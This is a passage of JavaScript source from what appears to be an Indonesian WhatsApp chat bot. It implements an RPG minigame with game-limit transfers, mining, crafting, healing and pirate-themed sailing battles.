if (args[1].includes("-")) return warning(`Jangan menggunakan -\n\nContoh : ${prefix+command} @6285600793871 2000`)
var anu = db.data.users[m.sender].glimit
if (anu < args[1] || anu == 'undefined') return warning(`Game Limit Kamu Tidak Mencukupi Untuk Transfer Sebesar Rp ${args[1]}, Kumpulkan Terlebih Dahulu\nKetik ${prefix}limit, untuk mengecek Game Limit mu!`)
addCountCmd('transfer', m.sender, _cmd)
db.data.users[m.sender].glimit -= parseInt(args[1])
db.data.users[users].glimit += parseInt(args[1])
vreden.sendTextWithMentions(m.chat, `Sukses transfer Game Limit sebesar ${args[1]} kepada @${users.split("@")[0]}`, m)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'joinrpg': {
if (db.data.users[m.sender].rpg) return warning(`Kamu Telah Join Sebelumnya`)
db.data.users[m.sender].rpg = true
let joinedrpg = `*GAME RPG STARTED*\n\nKamu telah login RPG-Game, sekarang kamu dapat menggunakan command RPG\n\n`
await vreden.sendMessage(m.chat, {
text: joinedrpg,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: "RPG-GAME (Pirate Adventure)",
body: 'Pirate adventure in search of riches',
thumbnailUrl: "https://telegra.ph/file/d661d7829411b8bff9f5f.jpg",
sourceUrl: "-",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'mining': {
if (!db.data.users[m.sender].rpg) return warning(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
if (db.data.rpg[m.sender].rpgspam) return m.reply('*[ ANTISPAM RPG ]*\n\nTunggu Command RPG\nPertama Kamu Selesai..')
if (!db.data.rpg[m.sender].pickaxe) return m.reply('Kamu Tidak Memiliki pickaxe\nSilahkan Buat Terlebih Dahulu\n\nKetik _.craft_')
if (db.data.rpg[m.sender].darahpickaxe < 1) return m.reply('☹️Pickaxe Kamu Rusak\nRawat Dulu Alat Tambangmu\n\nKetik _.rawat_')
db.data.rpg[m.sender].rpgspam = true
let besi = [2,1,6,1,0,3,7,8,3,2,0,7,1,9]
let batubara = [1,1,2,1,0,6,0,0,2,5,1,0,1,0]
let emas = [3,2,1,0,1,0,0,0,0,1,1,2,2,0]
let perak = [2,1,3,5,0,0,0,0,0,2,1,0,8,2]
const besinyo = await pickRandom(besi)
const batubaranyo = await pickRandom(batubara)
const emasnyo = await pickRandom(emas)
const peraknyo = await pickRandom(perak)
let mining = `*MINING ADVENTURE*\n\nItem Yang Didapat :\n- Besi: ${besinyo}\n- Emas: ${emasnyo}\n- Perak: ${peraknyo}\n- Batu Bara: ${batubaranyo}\n\n_🧰 Disimpan Dalam Inventory..._\n_❤️ Darah Berkurang 20_\n_⛏️ Ketahanan Pickaxe ${db.data.rpg[m.sender].darahpickaxe}%_\n\n`
await vreden.sendMessage(m.chat, {
text: mining,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: "RPG-GAME (Mining Resource)",
body: 'Mining natural resources',
thumbnailUrl: "https://telegra.ph/file/4ca67ad95bce6afa1a0f2.jpg",
sourceUrl: "-",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
db.data.rpg[m.sender].darahpickaxe -= 20
db.data.rpg[m.sender].besi += besinyo
db.data.rpg[m.sender].emas += emasnyo
db.data.rpg[m.sender].perak += peraknyo
db.data.rpg[m.sender].batubara += batubaranyo
db.data.rpg[m.sender].rpgspam = false
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'heal': {
if (!db.data.users[m.sender].rpg) return warning(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
if (!db.data.rpg[m.sender].darahuser < 1) return m.reply('*😑 Kamu Masih Sehat!*')
db.data.rpg[m.sender].darahuser += 100
editp('Mengistirahatkan Tubuh...','Memulihkan...','Darah Kamu Sudah Terisi...')
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'crafting': case 'craft': {
if (!db.data.users[m.sender].rpg) return warning(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
    if (args[0] === "kain") {
if (!args[1]) return m.reply(`*Masukan Jumlahnya!*\n\nContoh:\n.craft kain 1\n\nUntuk Membuat 1 Lembar Kain Diperlukan *2 Bulu Wolf*.\n\nSilahkan Berbulu Terlebih Dahulu!`)
if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka!*\n\nContoh:\n.craft kain 1\n\nUntuk Membuat 1 Lembar Kain Diperlukan *2 Bulu Wolf*.\n\nSilahkan Berbulu Terlebih Dahulu!`)
let bulu = Number(parseInt(args[1]) * 2)
if (db.data.rpg[m.sender].bulu < bulu) return m.reply(`*Bulu Wol Kamu (${db.data.rpg[m.sender].bulu}) Tidak Cukup Untuk Membuat ${args[1]} Lembar Kain*\n\nUntuk Membuat 1 Lembar Kain Diperlukan *2 Bulu Wolf*.\n\nSilahkan Berbulu Terlebih Dahulu!`)
db.data.rpg[m.sender].kain += parseInt(args[1])
db.data.rpg[m.sender].bulu -= bulu
balas(`Berhasil Membuat ${args[1]} Lembar Kain, Kamu Mempunyai ${db.data.rpg[m.sender].bulu} Bulu Lagi`)
    } else if (args[0] === "kapal") {
if (db.data.rpg[m.sender].kapal) return m.reply('Kamu Sudah Memiliki Kapal!')
let besi = Number(20)
let kayu = Number(50)
let kain = Number(2)
if (db.data.rpg[m.sender].besi < besi) return m.reply(`*Besi Kamu (${db.data.rpg[m.sender].besi}) Tidak Cukup Untuk Membuat Kapal*\n\nUntuk Membuat Kapal Diperlukan *20 Besi, 50 Kayu, 2 Kain*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
if (db.data.rpg[m.sender].kayu < kayu) return m.reply(`*Kayu Kamu (${db.data.rpg[m.sender].kayu}) Tidak Cukup Untuk Membuat Kapal*\n\nUntuk Membuat Kapal Diperlukan *20 Besi, 50 Kayu, 2 Kain*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
if (db.data.rpg[m.sender].kain < kain) return m.reply(`*Kain Kamu (${db.data.rpg[m.sender].kain}) Tidak Cukup Untuk Membuat Kapal*\n\nUntuk Membuat Kapal Diperlukan *20 Besi, 50 Kayu, 2 Kain*.\n\nSilahkan Crafting Kain Terlebih Dahulu!`)
db.data.rpg[m.sender].kapal = true
db.data.rpg[m.sender].besi -= besi
db.data.rpg[m.sender].kayu -= kayu
db.data.rpg[m.sender].kain -= kain
let kapal = `*Berhasil Membuat Kapal!*\n\nSisa Sumberdaya:\n- Besi: ${db.data.rpg[m.sender].besi}\n- Kain: ${db.data.rpg[m.sender].kain}\n- Kayu: ${db.data.rpg[m.sender].kayu}\n\n`
await vreden.sendMessage(m.chat, {
text: kapal,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: "RPG-GAME (Pirate Ship)",
body: 'Build a pirate ship',
thumbnailUrl: "https://telegra.ph/file/6868733df8aa286682274.jpg",
sourceUrl: "-",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
    } else if (args[0] === "kapak"){
if (db.data.rpg[m.sender].kapak) return m.reply('Kamu Sudah Memiliki Kapak!')
let besi = Number(2)
let kayu = Number(1)
if (db.data.rpg[m.sender].besi < besi) return m.reply(`*Besi Kamu (${db.data.rpg[m.sender].besi}) Tidak Cukup Untuk Membuat Kapak*\n\nUntuk Membuat Kapak Diperlukan *2 Besi, 1 Kayu*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
if (db.data.rpg[m.sender].kayu < kayu) return m.reply(`*Kayu Kamu (${db.data.rpg[m.sender].kayu}) Tidak Cukup Untuk Membuat Kapak*\n\nUntuk Membuat Kapak Diperlukan *2 Besi, 1 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
db.data.rpg[m.sender].kapak = true
db.data.rpg[m.sender].besi -= besi
db.data.rpg[m.sender].kayu -= kayu
let kapak = `*Berhasil Membuat Kapak!*\n\nSisa Sumberdaya:\n- Besi: ${db.data.rpg[m.sender].besi}\n- Kayu: ${db.data.rpg[m.sender].kayu}\n\n`
await vreden.sendMessage(m.chat, {
text: kapak,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: "RPG-GAME (Tools Crafting)",
body: 'Making equipment',
thumbnailUrl: "https://telegra.ph/file/454b6bac735cd5c9e860e.jpg",
sourceUrl: "-",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
    } else if (args[0] === "rumah"){
if (!(`${db.data.rpg[m.sender].wilayahrumah}` === `${db.data.rpg[m.sender].wilayah}`)) return m.reply(`Kamu Saat Ini Sedang Di ${db.data.rpg[m.sender].wilayah}, Kamu Hanya Dapat Membangun Rumah Di Indonesia, Silahkan Kembali Berlayar Ke Indonesia Untuk Membangun Rumah`)
if (!args[1]) return m.reply('*Masukan Jumlahnya!*\n\nContoh:\n.craft rumah 1\n\nUntuk Membuat 1 Rumah Diperlukan *6 Besi, 20 Kayu*. Pastikan Sumberdaya Kamu Cukup!')
if (isNaN(args[1])) return m.reply('*Jumlah Harus Berupa Angka!*\n\nContoh:\n.craft rumah 1\n\nUntuk Membuat 1 Rumah Diperlukan *6 Besi, 20 Kayu*. Pastikan Sumberdaya Kamu Cukup!')
let besi = Number(parseInt(args[1]) * 6)
let kayu = Number(parseInt(args[1]) * 20)
if (db.data.rpg[m.sender].besi < besi) return m.reply(`*Besi Kamu (${db.data.rpg[m.sender].besi}) Tidak Cukup Untuk Membuat Rumah*\n\nUntuk Membuat Rumah Diperlukan *6 Besi, 20 Kayu*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
if (db.data.rpg[m.sender].kayu < kayu) return m.reply(`*Kayu Kamu (${db.data.rpg[m.sender].kayu}) Tidak Cukup Untuk Membuat Rumah*\n\nUntuk Membuat Rumah Diperlukan *6 Besi, 20 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
db.data.rpg[m.sender].rumah += parseInt(args[1])
db.data.rpg[m.sender].besi -= besi
db.data.rpg[m.sender].kayu -= kayu
let rumah = `*Berhasil Membuat ${args[1]} Rumah!*\n\nJumlah: ${args[1]} Rumah\nLetak: Indonesia\n\n`
await vreden.sendMessage(m.chat, {
text: rumah,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: "RPG-GAME (House Crafting)",
body: 'Build a house to rest',
thumbnailUrl: "https://telegra.ph/file/748043e987c3b38708d44.jpg",
sourceUrl: "-",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
} else if (args[0] === "pickaxe"){
if (db.data.rpg[m.sender].pickaxe) return m.reply('Kamu Sudah Memiliki Pickaxe!')
let besi = Number(2)
let kayu = Number(1)
if (db.data.rpg[m.sender].besi < besi) return m.reply(`*Besi Kamu (${db.data.rpg[m.sender].besi}) Tidak Cukup Untuk Membuat Pickaxe*\n\nUntuk Membuat Pickaxe Diperlukan *2 Besi, 1 Kayu*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
if (db.data.rpg[m.sender].kayu < kayu) return m.reply(`*Kayu Kamu (${db.data.rpg[m.sender].kayu}) Tidak Cukup Untuk Membuat Pickaxe*\n\nUntuk Membuat Pickaxe Diperlukan *2 Besi, 1 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
db.data.rpg[m.sender].pickaxe = true
db.data.rpg[m.sender].besi -= besi
db.data.rpg[m.sender].kayu -= kayu
let pickaxe = `*Berhasil Membuat Pickaxe!*\n\nSisa Sumberdaya:\n- Besi: ${db.data.rpg[m.sender].besi}\n- Kayu: ${db.data.rpg[m.sender].kayu}\n\n`
await vreden.sendMessage(m.chat, {
text: pickaxe,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: "RPG-GAME (Tools Crafting)",
body: 'Making equipment',
thumbnailUrl: "https://telegra.ph/file/9bd57cb7d6e04a4a51d7c.jpg",
sourceUrl: "-",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
    } else if (args[0] === "bajuzirah"){
if (db.data.rpg[m.sender].bzirah) return m.reply('Kamu Sudah Memiliki Baju Zirah!')
let besi = Number(6)
let kayu = Number(2)
let kain = Number(10)
if (db.data.rpg[m.sender].besi < besi) return m.reply(`*Besi Kamu (${db.data.rpg[m.sender].besi}) Tidak Cukup Untuk Membuat Baju Zirah*\n\nUntuk Membuat Baju Zirah Diperlukan *6 Besi, 2 Kayu, 10 Kain*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
if (db.data.rpg[m.sender].kayu < kayu) return m.reply(`*Kayu Kamu (${db.data.rpg[m.sender].kayu}) Tidak Cukup Untuk Membuat Baju Zirah*\n\nUntuk Membuat Baju Zirah Diperlukan *6 Besi, 2 Kayu, 10 Kain*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
if (db.data.rpg[m.sender].kain < kain) return m.reply(`*Kain Kamu (${db.data.rpg[m.sender].kain}) Tidak Cukup Untuk Membuat Baju Zirah*\n\nUntuk Membuat Baju Zirah Diperlukan *6 Besi, 2 Kayu, 10 Kain*.\n\nSilahkan Crafting Kain Terlebih Dahulu!`)
db.data.rpg[m.sender].bzirah = true
db.data.rpg[m.sender].besi -= besi
db.data.rpg[m.sender].kayu -= kayu
db.data.rpg[m.sender].kain -= kain
let bajuzirah = `*Berhasil Membuat Baju Zirah!*\n\nSisa Sumberdaya:\n- Besi: ${db.data.rpg[m.sender].besi}\n- Kayu: ${db.data.rpg[m.sender].kayu}\n- Kain: ${db.data.rpg[m.sender].kain}\n\n`
await vreden.sendMessage(m.chat, {
text: bajuzirah,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: "RPG-GAME (Tools Crafting)",
body: 'Making equipment',
thumbnailUrl: "https://telegra.ph/file/2a8bf170a5b74aa808078.jpg",
sourceUrl: "-",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
    } else if (args[0] === "pedang"){
if (db.data.rpg[m.sender].pedang) return m.reply('Kamu Sudah Memiliki Pedang!')
let besi = Number(3)
let kayu = Number(1)
if (db.data.rpg[m.sender].besi < besi) return m.reply(`*Besi Kamu (${db.data.rpg[m.sender].besi}) Tidak Cukup Untuk Membuat Pedang*\n\nUntuk Membuat Pedang Diperlukan *3 Besi, 1 Kayu*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
if (db.data.rpg[m.sender].kayu < kayu) return m.reply(`*Kayu Kamu (${db.data.rpg[m.sender].kayu}) Tidak Cukup Untuk Membuat Pedang*\n\nUntuk Membuat Pedang Diperlukan *3 Besi, 1 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
db.data.rpg[m.sender].pedang = true
db.data.rpg[m.sender].besi -= besi
db.data.rpg[m.sender].kayu -= kayu
let pedang = `*Berhasil Membuat Pedang!*\n\nSisa Sumberdaya:\n- Besi: ${db.data.rpg[m.sender].besi}\n- Kayu: ${db.data.rpg[m.sender].kayu}\n\n`
await vreden.sendMessage(m.chat, {
text: pedang,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: "RPG-GAME (Tools Crafting)",
body: 'Making equipment',
thumbnailUrl: "https://telegra.ph/file/0c245751d14b42fe7f3c0.jpg",
sourceUrl: "-",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
    } else {
let craft = `*Apa Yang Ingin Kamu Buat?*

- kapal
- rumah
- kapak
- pickaxe
- pedang
- bajuzirah
- kain

*Contoh:*
.craft kapak

`
await vreden.sendMessage(m.chat, {
text: craft,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: "RPG-GAME (Crafting Item)",
body: 'Make items for survival and adventure',
thumbnailUrl: "https://telegra.ph/file/fed81e9a280d8a3965d6f.jpg",
sourceUrl: "-",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'berlayar': {
if (db.data.rpg[m.sender].rpgspam) return m.reply('*[ ANTISPAM RPG ]*\n\nTunggu Command RPG\nPertama Kamu Selesai..')
if (!db.data.users[m.sender].rpg) return warning(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
if (!db.data.rpg[m.sender].kapal) return m.reply('Kamu Tidak Mempunyai Kapal, Silahkan Crafting Kapal Terlebih Dahulu!')
if (db.data.rpg[m.sender].darahkapal < 1) return m.reply('Kapal Kamu Rusak, Perbaiki Terlebih Dahulu Kapal Mu\n\nKetik .rawatkapal')
if (db.data.rpg[m.sender].battleid) return m.reply('Kamu Masih Berlayar!')
if (db.data.rpg[m.sender].wilayah === args[0]) return m.reply(`Kamu Sedang Di ${args[0]} Saat Ini, Silahkan Pilih Destinasi Lain`)
if (args[0] === "indonesia") {
db.data.rpg[m.sender].rpgspam = true
editp('Menyiapkan Perbekalan...','Melepaskan Tali Kapal...','Kapal Mulai Berlayar Menjauhi Pelabuhan...')
let jnskpl = ["kargo","pesiar","nelayan","perang","tanker","kontainer","feri"]
let kruu = [14,68,64,44,24,6,8,48,32,18,10,22,6,42,12]
let jeniskapal = await pickRandom(jnskpl)
let kru = await pickRandom(kruu)
let battleid = await randomNomor(1000, 9999)
db.data.rpg[m.sender].wilayah = args[0]
db.data.rpg[m.sender].battleid = battleid
await sleep(10000)
let teks = `Ditengah perjalanan ke\n${args[0]} kamu bertemu\ndengan kapal *${jeniskapal}*\nyang memiliki kru dengan\njumlah *${kru} orang*, sedangkan kru\nkapalmu berjumlah *38 orang*\n\n*Apakah Kamu Akan Melakukan*\n*Pembajakan Ke Kapal Tersebut?*`
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"Serang🏴‍☠️\",\"id\":\".fed81e9a280d8a3965d6f ${battleid} ${jeniskapal} ${kru} ${args[0]}\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"Lewati Kapal🏳️\",\"id\":\".929e089ce3e77a38c398b ${battleid}\"}`
              }
           ]
sendButtonBiasa(m.chat, `*PIRATE BATTLE 🏴‍☠️*\n`, teks, button)
db.data.rpg[m.sender].rpgspam = false
} else if (args[0] === "india"){
db.data.rpg[m.sender].rpgspam = true
editp('Menyiapkan Perbekalan...','Melepaskan Tali Kapal...','Kapal Mulai Berlayar Menjauhi Pelabuhan...')
let jnskpl = ["kargo","pesiar","nelayan","perang","tanker","kontainer","feri"]
let kruu = [14,68,64,44,24,6,8,48,32,18,10,22,6,42,12]
let jeniskapal = await pickRandom(jnskpl)
let kru = await pickRandom(kruu)
let battleid = await randomNomor(1000, 9999)
db.data.rpg[m.sender].wilayah = args[0]
db.data.rpg[m.sender].battleid = battleid
await sleep(10000)
let teks = `Ditengah perjalanan ke\n${args[0]} kamu bertemu\ndengan kapal *${jeniskapal}*\nyang memiliki kru dengan\njumlah *${kru} orang*, sedangkan kru\nkapalmu berjumlah *38 orang*\n\n*Apakah Kamu Akan Melakukan*\n*Pembajakan Ke Kapal Tersebut?*`
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"Serang🏴‍☠️\",\"id\":\".fed81e9a280d8a3965d6f ${battleid} ${jeniskapal} ${kru} ${args[0]}\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"Lewati Kapal🏳️\",\"id\":\".929e089ce3e77a38c398b ${battleid}\"}`
              }
           ]
sendButtonBiasa(m.chat, `*PIRATE BATTLE 🏴‍☠️*\n`, teks, button)
db.data.rpg[m.sender].rpgspam = false
} else if (args[0] === "brazil"){
db.data.rpg[m.sender].rpgspam = true
editp('Menyiapkan Perbekalan...','Melepaskan Tali Kapal...','Kapal Mulai Berlayar Menjauhi Pelabuhan...')
let jnskpl = ["kargo","pesiar","nelayan","perang","tanker","kontainer","feri"]
let kruu = [14,68,64,44,24,6,8,48,32,18,10,22,6,42,12]
let jeniskapal = await pickRandom(jnskpl)
let kru = await pickRandom(kruu)
let battleid = await randomNomor(1000, 9999)
db.data.rpg[m.sender].wilayah = args[0]
db.data.rpg[m.sender].battleid = battleid
await sleep(10000)
let teks = `Ditengah perjalanan ke\n${args[0]} kamu bertemu\ndengan kapal *${jeniskapal}*\nyang memiliki kru dengan\njumlah *${kru} orang*, sedangkan kru\nkapalmu berjumlah *38 orang*\n\n*Apakah Kamu Akan Melakukan*\n*Pembajakan Ke Kapal Tersebut?*`
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"Serang🏴‍☠️\",\"id\":\".fed81e9a280d8a3965d6f ${battleid} ${jeniskapal} ${kru} ${args[0]}\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"Lewati Kapal🏳️\",\"id\":\".929e089ce3e77a38c398b ${battleid}\"}`
              }
           ]
sendButtonBiasa(m.chat, `*PIRATE BATTLE 🏴‍☠️*\n`, teks, button)
db.data.rpg[m.sender].rpgspam = false
} else if (args[0] === "rusia"){
db.data.rpg[m.sender].rpgspam = true
editp('Menyiapkan Perbekalan...','Melepaskan Tali Kapal...','Kapal Mulai Berlayar Menjauhi Pelabuhan...')
let jnskpl = ["kargo","pesiar","nelayan","perang","tanker","kontainer","feri"]
let kruu = [14,68,64,44,24,6,8,48,32,18,10,22,6,42,12]
let jeniskapal = await pickRandom(jnskpl)
let kru = await pickRandom(kruu)
let battleid = await randomNomor(1000, 9999)
db.data.rpg[m.sender].wilayah = args[0]
db.data.rpg[m.sender].battleid = battleid
await sleep(10000)
let teks = `Ditengah perjalanan ke\n${args[0]} kamu bertemu\ndengan kapal *${jeniskapal}*\nyang memiliki kru dengan\njumlah *${kru} orang*, sedangkan kru\nkapalmu berjumlah *38 orang*\n\n*Apakah Kamu Akan Melakukan*\n*Pembajakan Ke Kapal Tersebut?*`
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"Serang🏴‍☠️\",\"id\":\".fed81e9a280d8a3965d6f ${battleid} ${jeniskapal} ${kru} ${args[0]}\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"Lewati Kapal🏳️\",\"id\":\".929e089ce3e77a38c398b ${battleid}\"}`
              }
           ]
sendButtonBiasa(m.chat, `*PIRATE BATTLE 🏴‍☠️*\n`, teks, button)
db.data.rpg[m.sender].rpgspam = false
} else if (args[0] === "australia"){
db.data.rpg[m.sender].rpgspam = true
editp('Menyiapkan Perbekalan...','Melepaskan Tali Kapal...','Kapal Mulai Berlayar Menjauhi Pelabuhan...')
let jnskpl = ["kargo","pesiar","nelayan","perang","tanker","kontainer","feri"]
let kruu = [14,68,64,44,24,6,8,48,32,18,10,22,6,42,12]
let jeniskapal = await pickRandom(jnskpl)
let kru = await pickRandom(kruu)
let battleid = await randomNomor(1000, 9999)
db.data.rpg[m.sender].wilayah = args[0]
db.data.rpg[m.sender].battleid = battleid
await sleep(10000)
let teks = `Ditengah perjalanan ke\n${args[0]} kamu bertemu\ndengan kapal *${jeniskapal}*\nyang memiliki kru dengan\njumlah *${kru} orang*, sedangkan kru\nkapalmu berjumlah *38 orang*\n\n*Apakah Kamu Akan Melakukan*\n*Pembajakan Ke Kapal Tersebut?*`
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"Serang🏴‍☠️\",\"id\":\".fed81e9a280d8a3965d6f ${battleid} ${jeniskapal} ${kru} ${args[0]}\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"Lewati Kapal🏳️\",\"id\":\".929e089ce3e77a38c398b ${battleid}\"}`
              }
           ]
sendButtonBiasa(m.chat, `*PIRATE BATTLE 🏴‍☠️*\n`, teks, button)
db.data.rpg[m.sender].rpgspam = false
} else if (args[0] === "kanada"){
db.data.rpg[m.sender].rpgspam = true
editp('Menyiapkan Perbekalan...','Melepaskan Tali Kapal...','Kapal Mulai Berlayar Menjauhi Pelabuhan...')
let jnskpl = ["kargo","pesiar","nelayan","perang","tanker","kontainer","feri"]
let kruu = [14,68,64,44,24,6,8,48,32,18,10,22,6,42,12]
let jeniskapal = await pickRandom(jnskpl)
let kru = await pickRandom(kruu)
let battleid = await randomNomor(1000, 9999)
db.data.rpg[m.sender].wilayah = args[0]
db.data.rpg[m.sender].battleid = battleid
await sleep(10000)
let teks = `Ditengah perjalanan ke\n${args[0]} kamu bertemu\ndengan kapal *${jeniskapal}*\nyang memiliki kru dengan\njumlah *${kru} orang*, sedangkan kru\nkapalmu berjumlah *38 orang*\n\n*Apakah Kamu Akan Melakukan*\n*Pembajakan Ke Kapal Tersebut?*`
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"Serang🏴‍☠️\",\"id\":\".fed81e9a280d8a3965d6f ${battleid} ${jeniskapal} ${kru} ${args[0]}\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"Lewati Kapal🏳️\",\"id\":\".929e089ce3e77a38c398b ${battleid}\"}`
              }
           ]
sendButtonBiasa(m.chat, `*PIRATE BATTLE 🏴‍☠️*\n`, teks, button)
db.data.rpg[m.sender].rpgspam = false
} else if (args[0] === "greenland"){
db.data.rpg[m.sender].rpgspam = true
editp('Menyiapkan Perbekalan...','Melepaskan Tali Kapal...','Kapal Mulai Berlayar Menjauhi Pelabuhan...')
let jnskpl = ["kargo","pesiar","nelayan","perang","tanker","kontainer","feri"]
let kruu = [14,68,64,44,24,6,8,48,32,18,10,22,6,42,12]
let jeniskapal = await pickRandom(jnskpl)
let kru = await pickRandom(kruu)
let battleid = await randomNomor(1000, 9999)
db.data.rpg[m.sender].wilayah = args[0]
db.data.rpg[m.sender].battleid = battleid
await sleep(10000)
let teks = `Ditengah perjalanan ke\n${args[0]} kamu bertemu\ndengan kapal *${jeniskapal}*\nyang memiliki kru dengan\njumlah *${kru} orang*, sedangkan kru\nkapalmu berjumlah *38 orang*\n\n*Apakah Kamu Akan Melakukan*\n*Pembajakan Ke Kapal Tersebut?*`
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"Serang🏴‍☠️\",\"id\":\".fed81e9a280d8a3965d6f ${battleid} ${jeniskapal} ${kru} ${args[0]}\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"Lewati Kapal🏳️\",\"id\":\".929e089ce3e77a38c398b ${battleid}\"}`
              }
           ]
sendButtonBiasa(m.chat, `*PIRATE BATTLE 🏴‍☠️*\n`, teks, button)
db.data.rpg[m.sender].rpgspam = false
} else {
let berlayar = `*Pilih Destinasi Berlayar!*

🔵 indonesia
🔴 kanada
⚪ rusia
⚫ india
🟣 brazil
🟠 australia
🟢 greenland

Contoh:
${prefix + command} rusia`
await vreden.sendMessage(m.chat, {
text: berlayar,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: "PIRATE ADVENTURE",
body: 'Sail across the ocean and go on adventures',
thumbnailUrl: "https://telegra.ph/file/4275a0a1fcf450835b0ef.jpg",
sourceUrl: "-",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'fed81e9a280d8a3965d6f': {
let battleid = db.data.rpg[m.sender].battleid
let argas = args[0]
if (`${battleid}` === `${argas}`) {
if (args[1] === "kargo") poink = 40
if (args[1] === "pesiar") poink = 60
if (args[1] === "nelayan") poink = 20
if (args[1] === "perang") poink = 80
if (args[1] === "tanker") poink = 40
if (args[1] === "kontainer") poink = 40
if (args[1] === "feri") poink = 30
let poinkru = args[2] / 2
let point = poink + poinkru
let pon = poink / 2
let duit = `${point}00000`
let cekk = 80
if (point < cekk) {
editp("Memulai Penyerangan!🏴‍☠️","Kapten Kapal Berhasil Disandera!",`Pembajakan Berhasil!\nMengambil Alih Kapal!🏴‍☠️`)
db.data.rpg[m.sender].darahkapal -= 20
db.data.rpg[m.sender].kayu += poink
db.data.rpg[m.sender].kain += pon
db.data.rpg[m.sender].battleid = ""
db.data.users[m.sender].saldo += parseInt(duit)
await sleep(5000)
let teks = `*🏴‍☠️DESTINASI SAMPAI🏴‍☠️*\n\n📍 ${args[3]}\n*Reward Perjalanan:*\n- Uang: ${duit} (Tebusan)\n- Kayu: ${poink} (Rombak Kapal)\n- Kain: ${pon} (Rombak Layar)\n\n`
await vreden.sendMessage(m.chat, {
text: teks,
